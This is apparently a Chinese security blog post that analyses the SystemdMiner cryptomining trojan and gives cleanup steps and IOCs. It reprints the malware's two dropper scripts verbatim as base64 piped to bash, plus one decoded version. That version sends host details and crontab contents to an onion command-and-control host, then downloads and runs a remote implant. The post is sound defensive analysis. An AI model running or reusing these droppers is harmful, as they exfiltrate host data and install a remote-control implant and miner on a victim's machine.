---
title: "SystemdMiner 挖矿木马分析"
date:   2021-11-08  16:54:00 +0800
layout: post
tag:
- Trojan
categories:
- Security
---

SystemdMiner 挖矿木马分析与处置

------
## 背景
之前应急时捕获分析过一个挖矿样本，后续因为逆向功底太差就搁置了，最近带新人尝试重新分析这个样本，发现这个挖矿样本仍然存活，并且有了不少改进。以下截图是2021年11月6日捕获的样本并提交virustotal分析的结果，首次提交并且只有一个引擎提示风险，话不多说，直接进行分析。
![20211108-01.png](/images/20211108-01.png)
申明一点儿：事后，全网检索了一下，发现有部分内容和SystemdMiner是有关联的，部分文章将发现的相关样本称为SystemdMiner挖矿木马，该样本我在19年12月首次捕获并进行分析，当时由于脚本伪装成aliyun.sh，我尚未起名，以标题为《一个名叫aliyun的挖矿木马处理过程》进行分析和通报，深信服的一篇分析文章的概述写到：
> 最近，深信服安全团队捕获到SystemdMiner挖矿木马最新变种，该家族在2019年被首次发现，起初因其组件都以systemd-<XXX>命名而得名，但慢慢的，它们开始弃用systemd的命名形式，改为了随机名。
我又全网检索了一下，感觉和大名鼎鼎的SystemdMiner挖矿木马差别不少，具体对比参考360 netlab的分析文章，我感觉我之前捕获的样本和大名鼎鼎的SystemdMiner家族挖矿木马差别很大，只是部分功能有借鉴。本人非一线安全研究人员，此处是个人观点，没必要上纲上线。为了方便称呼，以下均称为：SystemdMiner挖矿木马。

## 分析
### 现象
挖矿现象很明显，直接把我这个小破本的CPU性能压榨的一滴不剩。
![20211108-02.png](/images/20211108-02.png)
想都不用想，如果直接杀掉挖矿进程稍等片刻就会有另一个随机命名的挖矿进程继续运行，继续压榨我这个小破本。对于中招的用户，可以先kill掉挖矿进程，然后再系统的处置入侵相关事宜。
### 提取样本
#### 挖矿进程
挖矿的进程是23632，查看该进程相关信息，进入/proc/23632目录，运行文件已删除。
![20211108-03.png](/images/20211108-03.png)
/proc/23632/fd目录下发现关联的一些文件信息
![20211108-04.png](/images/20211108-04.png)
如果看过之前分析的第一篇文章，对 /tmp/.X11-unix/目录文件应该不陌生，里面的文件存储着远控和挖矿进程id信息。
![20211108-05.png](/images/20211108-05.png)

我们先将已删除的文件提取出来
![20211108-07.png](/images/20211108-07.png)

提交到virustotal分析，发现几天前应该是有人中招了。
![20211108-08.png](/images/20211108-08.png)

#### 远控
接下来轻车熟路，进入/tmp/.X11-unix/，查看其他进程信息。
![20211108-09.png](/images/20211108-09.png)
其中名为22的文件内容为空，不清楚原因，出了挖矿的，另一个名为01的文件，应该存储着远控的进程id，这里是22545。
![20211108-10.png](/images/20211108-10.png)
同样的配方，导出远控的进程
![20211108-11.png](/images/20211108-11.png)

#### 其他
通过仔细查找，发现root目录下存在两个可疑文件：
![20211108-12.png](/images/20211108-12.png)

* .systemd-private-a7sebNyLZedpFNW6SxqOF2F7ggZv2te.sh
* .unixdb.sh

.systemd-private-a7sebNyLZedpFNW6SxqOF2F7ggZv2te.sh脚本内容如下：
![20211108-13.png](/images/20211108-13.png)
文本内容如下：
```
 #!/bin/bash
exec &>/dev/null
echo a7sebNyLZedpFNW6SxqOF2F7ggZv2te
echo YTdzZWJOeUxaZWRwRk5XNlN4cU9GMkY3Z2dadjJ0ZQpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJtaGV2a2s0b2RnenFwdDJoYmozaGh3MnV6NHZodW5vbzU1ZXZld3JnbW91eWllaGNhbHRtYnJxZCIpCgpzb2NreigpIHsKbj0oZG5zLmRpZ2l0YWxlLWdlc2VsbHNjaGFmdC5jaCBkb2gubGkgZG9oLnB1YiBmaS5kb2guZG5zLnNub3B5dGEub3JnIGh5ZHJhLnBsYW45LW5zMS5jb20gcmVzb2x2ZXItZXUubGVsdXguZmkgZG5zLmhvc3R1eC5uZXQgZG5zLnR3bmljLnR3IGRvaC1maS5ibGFoZG5zLmNvbSBmaS5kb2guZG5zLnNub3B5dGEub3JnIHJlc29sdmVyLWV1LmxlbHV4LmZpIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbWU9cmVsYXkudG9yMnNvY2tzLmluIikKcT0ke25bJCgoUkFORE9NJSR7I25bQF19KSldfQpzPSQoJGMgaHR0cHM6Ly8kcS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8Z3JlcCAtRXYgWy5dMHxzb3J0IC11Unx0YWlsIC0xKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAuICRIT01FIC91c3IvYmluICRkIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaXQKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash
```
.unixdb.sh内容如下：
![20211108-14.png](/images/20211108-14.png)
文本内容如下：
```
#!/bin/bash
exec &>/dev/null
echo yyANhZDFOs31F9WgqOovurruEMT3Z+v82MG0m9elafh8GU1+u4/78NZoKz2rA7O2
echo eXlBTmhaREZPczMxRjlXZ3FPb3Z1cnJ1RU1UM1ordjgyTUcwbTllbGFmaDhHVTErdTQvNzhOWm9LejJyQTdPMgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ1bml4ZGJudWFkeG13dG9iIikKCnNvY2t6KCkgewpuPShkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgdW5jZW5zb3JlZC5hbnkuZG5zLm5peG5ldC54eXopCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTUpKV19LyRwIHwgZ3JlcCAtb0UgIlxiKFswLTldezEsM31cLil7M31bMC05XXsxLDN9XGIiIHx0ciAnICcgJ1xuJ3xzb3J0IC11UnxoZWFkIC0xKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAkZCAvdG1wIC92YXIvdG1wIC9kZXYvc2htIC91c3IvYmluIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmZXhlCmY9L2ludC4kKHVuYW1lIC1tKQp4PS4vJChkYXRlfG1kNXN1bXxjdXQgLWYxIC1kLSkKJGMgLXggc29ja3M1aDovLyRzOjkwNTAgJHQub25pb24kZiAtbyR4IHx8ICRjICQxJGYgLW8keApjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuY2ggdG9yMndlYi5pbyB0b3Iyd2ViLnRvIHRvcjJ3ZWIuc3UKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLTEgL3RtcC8uWDExLXVuaXgvMDApL3N0YXR1czsgdGhlbgp1ICR0LiRoCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash
```
通过查看定时任务，发现两个定时任务，一明一暗，熟悉的配方，熟悉的味道：
![20211108-15.png](/images/20211108-15.png)
![20211108-16.png](/images/20211108-16.png)
另一个定时任务运行的脚本位于/opt目录下，内容和 .systemd-private-a7sebNyLZedpFNW6SxqOF2F7ggZv2te.sh相同，

到这里相关的文件大概收集的差不多了，接下来杀掉相关进程，先尝试分析一下。
![20211108-17.png](/images/20211108-17.png)

### 样本分析
首先先分析两个运行脚本，.systemd-private-a7sebNyLZedpFNW6SxqOF2F7ggZv2te.sh base64 解码以后的内容为：
![20211108-18.png](/images/20211108-18.png)
![20211108-19.png](/images/20211108-19.png)
格式化以后的代码为：
```
exec &>/dev/null
export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin

d=$(grep x:$(id -u): /etc/passwd | cut -d: -f6)
c=$(echo "curl -4fsSLkA- -m200")
t=$(echo "mhevkk4odgzqpt2hbj3hhw2uz4vhunoo55evewrgmouyiehcaltmbrqd")

sockz() {
	n=(dns.digitale-gesellschaft.ch doh.li doh.pub fi.doh.dns.snopyta.org hydra.plan9-ns1.com resolver-eu.lelux.fi dns.hostux.net dns.twnic.tw doh-fi.blahdns.com fi.doh.dns.snopyta.org resolver-eu.lelux.fi doh.li dns.digitale-gesellschaft.ch)
	p=$(echo "dns-query?name=relay.tor2socks.in")
	q=${n[$((RANDOM % ${#n[@]}))]}
	s=$($c https://$q/$p | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | tr ' ' '\n' | grep -Ev [.]0 | sort -uR | tail -1)
}

fexe() {
	for i in . $HOME /usr/bin $d /var/tmp; do echo exit >$i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break; done
}

u() {
	sockz
	f=/int.$(uname -m)
	x=./$(date | md5sum | cut -f1 -d-)
	r=$(curl -4fsSLk checkip.amazonaws.com || curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a | grep 'inet ' | awk {'print $2'} | md5sum | awk {'print $1'})_$(crontab -l | base64 -w0)
	$c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$r
	chmod +x $x
	$x
	rm -f $x
}

for h in tor2web.in tor2web.it; do
	if ! ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status; then
		fexe
		u $t.$h
		ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (
			cd /tmp
			u $t.$h
		)
		ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (
			cd /dev/shm
			u $t.$h
		)
	else
		break
	fi
done
```
分析：
随机找个公共DNS服务器解析域名relay.tor2socks.in，主要目的是通过Https加密DNS查询结果，绕过了IDS等安全设备IOCS恶意域名检测，下载远控，提交主机信息并运行，这里有点儿聪明，通过socket5的方式用relay.tor2socks.in代理访问C&C域名， 解决了大部分设备无法访问洋葱网络的问题。也可以直接通过tor2web服务访问C&C主机。
![20211108-20.png](/images/20211108-20.png)

unixdb.sh 脚本文件大同小异，就是一个精简版的.systemd-private-a7sebNyLZedpFNW6SxqOF2F7ggZv2te.sh C&C服务器和dns的查询地址有些许变化。

int.x86_64文件分析
使用IDA反汇编，毫无疑问，正常加壳操作，尝试脱壳。
![20211108-21.png](/images/20211108-21.png)

远程调试，应该是程序设置了反调试，使用gdb也没法调试，尝试简单的绕过，发现并不能成功，这块触及到我能力的盲区了，19年不会逆向，后来勉强通过远程调试，找到了4个shell脚本，今天又遇到了当初的难题，又困在了逆向分析上面，吐一口老血。
![20211108-22.png](/images/20211108-22.png)
![20211108-23.png](/images/20211108-23.png)

## 处置
1、通过查看/tmp/.X11-unix/文件，获取挖矿和远控的进程id,使用 ``` kill -9 进程id``` 杀死相关进程
2、使用 ```crontab -e``` 命令，移除第一个定时任务，然后删除 ```/etc/cron.d/0systemd-private-* ``` 文件
3、删除 ```/opt/systemd-private-*.sh``` shell脚本
4、对于/tmp和/dev/shm文件，重启系统，下载的恶意文件就会自动清楚。
5、由于我这里是直接拿一个最小化安装的Linux系统做分析，样本都是我自行部署的，现实情况下，攻击者可能通过其他途径，如：弱口令、RCE等形式部署的自动或者半自动部署的挖矿及远控程序，直白一点儿就是移除挖矿比较容易，但是定位攻击者从那里进来的比较困难，各位老铁要加油，实在不行，重做系统吧。


## IOCS
挖矿样本hash：
MD5 79d6d20a4500eeffe225de74164ad59e
SHA-1 1e52c9a4c8402543125f937c7c3eaf1b206d1b6e
SHA-256 e45da0ba81b4d06737aaa79b096c2d11eeed0952c7d1ba9c65e81de41bd1fbd8


远控样本(int.x86_64)hash：
MD5 079d848dd5b0ad35f5d5d7a5b52ea0bf
SHA-1 13cd0f45b112cd60e34620991261f2f3f3b009f9
SHA-256 d56ff8bd5356862356379182f60b51795bbe9e3bc077ea2fd20d1d30011ab163

mhevkk4odgzqpt2hbj3hhw2uz4vhunoo55evewrgmouyiehcaltmbrqd.onion
unixdbnuadxmwtob.onion
*.tor2web.it
*.tor2web.in 
*.tor2web.ch 
*.tor2web.io 
*.tor2web.to 
*.tor2web.su

## 参考
- [https://www.virustotal.com/gui/file/e45da0ba81b4d06737aaa79b096c2d11eeed0952c7d1ba9c65e81de41bd1fbd8/details](https://www.virustotal.com/gui/file/e45da0ba81b4d06737aaa79b096c2d11eeed0952c7d1ba9c65e81de41bd1fbd8/details)【virustotal 挖矿分析结果 】
- [https://zh.gouma.org/Internet/How-to-Access-onion-Sites-Also-Known-as-Tor-Hidden-Services-/](https://zh.gouma.org/Internet/How-to-Access-onion-Sites-Also-Known-as-Tor-Hidden-Services-/)【Tor隐藏服务】
- [https://www.freebuf.com/articles/system/233138.html](https://www.freebuf.com/articles/system/233138.html)【SystemedMiner再次更新，使用Socket5中转访问C&C】
- [https://hksanduo.github.io/2019/12/19/2019-12-19-clean-up-a-mining-trojan-named-aliyun](https://hksanduo.github.io/2019/12/19/2019-12-19-clean-up-a-mining-trojan-named-aliyun)【一个名叫aliyun的挖矿木马处理过程】
- [https://blog.netlab.360.com/systemdminer-jie-ji-xia-dan-tong-guo-ddg-chuan-bo-zi-shen/](https://blog.netlab.360.com/systemdminer-jie-ji-xia-dan-tong-guo-ddg-chuan-bo-zi-shen/)【systemdMiner 借鸡下蛋，通过 DDG 传播自身】
